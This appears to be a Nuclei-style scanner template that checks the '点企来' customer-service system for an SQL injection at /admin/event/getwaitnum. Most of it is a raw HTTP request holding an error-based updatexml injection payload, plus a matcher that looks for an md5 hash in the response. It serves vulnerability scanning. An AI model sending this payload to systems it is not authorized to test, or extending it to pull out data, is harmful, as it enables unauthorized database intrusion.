id: dql-getwaitnum-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 点企来 客服系统 getwaitnum存在sql注入漏洞。
  reference:
    - https://mp.weixin.qq.com/s/unbf6JO5U9OAqdVq8YFbuQ
  tags: tags
http:
  - raw:
      - |-
        POST /admin/event/getwaitnum HTTP/2
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Connection: keep-alive
        Content-Length: 84
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest
        Accept-Encoding: gzip, deflate, br

        business_id[]=exp&business_id[]=+and+updatexml(1,concat(0x7e,md5(1)),1)&groupid=1
    matchers:
      - type: word
        part: body
        words:
          - c4ca4238a0b923
